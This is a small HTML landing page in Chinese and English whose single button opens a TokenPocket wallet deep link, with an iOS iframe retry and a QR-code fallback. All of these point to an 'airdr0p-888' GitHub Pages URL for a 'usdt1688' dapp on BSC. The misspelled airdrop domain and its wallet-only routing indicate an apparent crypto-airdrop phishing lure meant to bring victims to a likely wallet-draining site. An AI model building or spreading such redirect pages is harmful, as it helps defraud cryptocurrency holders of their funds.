<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>打开 TP 钱包</title>
  <style>
    body,html{margin:0;padding:0;height:100%;background:#0F172A;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;}
    .btn{
      padding:16px 40px;
      font-size:18px;
      font-weight:600;
      background:linear-gradient(135deg,#00A3FF,#00C4FF);
      color:white;
      border:none;
      border-radius:16px;
      box-shadow:0 8px 20px rgba(0,163,255,.4);
      cursor:pointer;
    }
    .qrcode{margin-top:20px;display:none;text-align:center;}
    .qrcode img{width:160px;border:6px solid #fff;border-radius:12px;}
  </style>
</head>
<body>

<button class="btn" onclick="openTP()">Open in TP Wallet (BSC)</button>

<div class="qrcode" id="qr">
  <p>请用 TP 钱包扫码打开</p>
  <img id="img" src="">
</div>

<script>
const URL = "https://airdr0p-888.github.io/usdt1688/index1.html";

function openTP(){
  if(/tokenpocket|tpdapp/i.test(navigator.userAgent)){
    location.href=URL; return;
  }
  const scheme = `tpdapp://open?params=${encodeURIComponent(JSON.stringify({url:URL,chain:"BSC"}))}`;
  location.href = scheme;

  setTimeout(()=>{ // iOS 增强
    const f=document.createElement('iframe');
    f.style.display='none'; f.src=scheme;
    document.body.appendChild(f);
    setTimeout(()=>f.remove(),2000);
  },300);

  setTimeout(()=>{ // 失败出二维码
    document.getElementById('qr').style.display='block';
    document.getElementById('img').src=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(URL)}`;
  },3500);
}
</script>

</body>
</html>
